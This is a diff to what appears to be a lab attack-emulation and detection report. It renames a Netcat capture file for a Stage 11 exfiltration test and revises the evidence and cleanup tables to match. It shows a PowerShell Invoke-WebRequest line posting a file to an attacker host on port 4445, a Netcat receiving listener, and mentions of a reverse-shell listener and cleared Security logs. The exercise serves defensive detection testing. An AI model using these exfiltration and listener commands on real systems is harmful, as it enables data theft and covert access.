@@ -861,7 +861,7 @@ Invoke-WebRequest -Uri "http://192.168.60.135:4445/upload" -Method Post -InFile 
 set -euo pipefail
 
 LISTEN_PORT=4445
-OUTPUT_FILE="extracted_data.zip"  # Raw HTTP request capture; not a standalone ZIP archive
+OUTPUT_FILE="stage11-http-request.bin"  # Raw HTTP request capture; not a standalone ZIP archive
 
 nc -lvnp "$LISTEN_PORT" > "$OUTPUT_FILE"
 ```
@@ -901,7 +901,7 @@ The rule identifies PowerShell web-request activity, not independent proof that 
 | `4444` | Stage 8 | Netcat listener for the reverse shell |
 | `4445` | Stage 11 | Netcat receiver for the HTTP POST request |
 
-**Verdict: ❌ No preserved Stage 11 detection or completed transfer evidence.** The committed Windows and Kali scripts both target TCP port `4445`, but no preserved capture, extracted ZIP body, matching SHA256 result, or raw `100413` alert demonstrates an end-to-end transfer. The filename `extracted_data.zip` in the Kali script is misleading: Netcat saves the raw HTTP request stream (headers plus body), not a clean ZIP archive.
+**Verdict: ❌ No preserved Stage 11 detection or completed transfer evidence.** The committed Windows and Kali scripts both target TCP port `4445`, but no preserved capture, extracted ZIP body, matching SHA256 result, or raw `100413` alert demonstrates an end-to-end transfer. The Kali script now names its output `stage11-http-request.bin` (renamed 2026-11-02) because Netcat saves the raw HTTP request stream (headers plus body), not a clean ZIP archive.
 ---
 
 ## 5. Attack Timeline (UTC)
@@ -1047,7 +1047,7 @@ Everything the emulation leaves behind, with the command that removes it.
 | Exfiltration archive | 11 | `C:\Windows\Temp\exfil_test.zip` | `del C:\Windows\Temp\exfil_test.zip` |
 | Locked account `LENOVO` | 2, 3 | Windows local accounts | `net user lenovo /active:yes` |
 | Cleared Security log | 10 | Windows Security log | Not recoverable on the host; the history remains in Wazuh |
-| Raw HTTP request capture (**not yet evidenced**; current script names its output `extracted_data.zip`, but the contents are not a standalone ZIP) | 11 | Kali working directory (the directory from which the script is run) | Preserve the capture for analysis; extract the HTTP body before hashing it as a ZIP, then remove temporary files after evidence collection |
+| Raw HTTP request capture (**not yet evidenced**; current script names its output `stage11-http-request.bin`; the contents are a raw HTTP request, not a standalone ZIP) | 11 | Kali working directory (the directory from which the script is run) | Preserve the capture for analysis; extract the HTTP body before hashing it as a ZIP, then remove temporary files after evidence collection |
 | Packet capture and Hydra state | 0 | Kali working directory | Delete only files actually created during testing |
 | Listeners | 6, 8, 11 | Kali ports `8000` (Stage 6 EICAR HTTP server), `4444` (Stage 8 reverse-shell listener), and `4445` (Stage 11 Netcat receiver for the Windows HTTP POST request) | Stop each listener after its corresponding stage; terminate the associated process when testing is complete. |
 
